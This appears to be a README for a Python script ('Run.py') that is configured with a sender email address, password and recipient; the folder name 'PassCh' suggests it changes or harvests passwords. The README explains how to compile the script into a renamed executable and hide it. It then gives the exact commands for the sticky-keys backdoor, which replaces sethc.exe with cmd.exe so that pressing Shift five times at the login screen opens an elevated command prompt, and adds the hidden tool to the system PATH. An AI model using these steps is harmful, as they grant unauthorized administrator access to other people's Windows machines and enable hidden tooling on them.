Requirement: Python3.x installed

Link download Python: https://www.python.org/downloads/

-----------------------------------------------------------------------------------------

*Setup:

------------------------------ STAGE 1: Create file .exe --------------------------------

1) Edit MyAddr, MyPass, ToAddr in "Run.py" before using

2) Press Win+R to open Run box, type "cmd" without quote and press Enter

3) Write this command to the command prompt:
		
		pip install pyinstaller 
		
4) After successfully installed pyinstaller, type 

		cd path
		
	which path is a folder contains "Run.py"
	
	For example, I put "Run.py" in a folder's name "PassCh" in C: --> the command will be:

		cd C:\PassCh
		
5) Type this command and wait until it's done: 

		pyinstaller --onefile Run.py
		
6) After it's done, there'll be several folder, go to "dist" folder, rename "Run.exe" into whatever you like and copy to everywhere you find it secret

------------------------------ STAGE 2: "Stick key" trick -------------------------------

* First case: You can boot into your system

1) Open Command Prompt with administrator privilledge

2) Enter as following

		copy c:\windows\system32\sethc.exe c:\
		
		copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe

	If there has a file named "sethc - Copy.exe", it means you're doing right

3) Press SHIFT 5 times and the Command Prompt will pop up

----------------------------- STAGE 3: Add folder to path -------------------------------

1) Type as follow into Command Prompt

		setx /M path "%path%;<DirectoryFolder>"
		
	Which <DirectoryFolder> will be the permanent path to folder contains .exe file in stage 1
	
	Ex: I renamed "Run.exe" into "Email.exe" and moved to C:\MySecret
	
		-> setx /M path "%path%;C:\MySecret"
		
--------------------- STAGE 4: Using "Stick key" trick to run .exe ----------------------

1) Press SHIFT 5 times and the Command Prompt will pop up

2) Type the name of .exe file you have renamed

	Ex: In stage 3, the file's name is "Email.exe"
		
		-> Email
		
	or
	
		-> email
		
	It is non case sensitive